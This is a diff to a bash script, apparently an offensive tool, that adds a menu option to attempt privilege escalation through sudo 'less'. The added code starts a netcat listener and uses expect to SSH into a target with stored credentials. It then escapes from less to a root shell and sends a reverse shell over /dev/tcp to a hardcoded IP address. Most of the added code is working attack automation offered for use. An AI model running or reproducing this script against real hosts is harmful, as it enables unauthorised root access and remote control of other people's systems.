@@ -99,6 +99,16 @@ function start() {
             if [ $? -gt 0 ]; then
             sudo apt install expect -y
       fi
+
+      xterm -v >/dev/null 
+            if [ $? -gt 0 ]; then
+            sudo apt-get install xterm -y
+      fi
+
+      searchsploit -u
+            if [ $? -ne 6 ]; then
+            sudo apt install exploitdb -y
+      fi
 }
 #Calling function
 start
@@ -570,4 +580,72 @@ echo "
         SEPARATE TEXT FILE LOCATED AT:
     ./I_AM_ROOT/$IP_ADDRESS/$REFI
      "
+###################################################################################################################
+sleep 3
 
+
+menu_option_one() {
+
+    MSGA="ESTABLISHING CONNECTION FOR PRIVILE ESCALATION......."
+      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSGA"
+    echo
+    echo
+    sleep 2
+    xterm -e 'nc -nlvp 8080' &
+    sleep 2
+    expect -c "\
+    set timeout (5)
+    set env(TERM)
+    sleep 2
+    spawn ssh -t $USERNAME@$IP_ADDRESS
+    sleep 1
+    expect \"*assword*\r\"
+    send \"$PASSWD\r\"
+    sleep 2
+    send \"sudo less /etc/profile\r\"
+    sleep 1
+    expect \"*assword*\r\"
+    send \"$PASSWD\r\"
+    sleep 2
+    send \"!/bin/sh\r\"
+    sleep 1
+    send \"bash -i >& /dev/tcp/192.168.91.129/8080 0>&1\r\"
+    interact 
+
+ "
+}
+
+menu_option_two() {
+    echo "GOOD BYE"
+}
+
+
+press_enter() {
+    echo ""
+    echo -n " Press Enter to continue "
+    read
+    clear
+}
+
+
+incorrect_selection() {
+    echo "Incorrect selection! Try again."
+}
+
+
+until [ "$selection" = "1" ] || [ "$selection" = "2" ]; do
+    clear
+    echo "Would to Attempt Privilege Escalation Using Sudo 'less' ?"
+    echo ""
+    echo "  1 - YES"
+    echo "  2 - NO"
+    echo ""
+    echo -n "   Enter selection: "
+    read selection
+    echo ""
+    case $selection in
+        1 ) clear; menu_option_one;;
+        2 ) clear; menu_option_two;;
+        * ) clear; incorrect_selection ; press_enter ;;
+    esac
+done
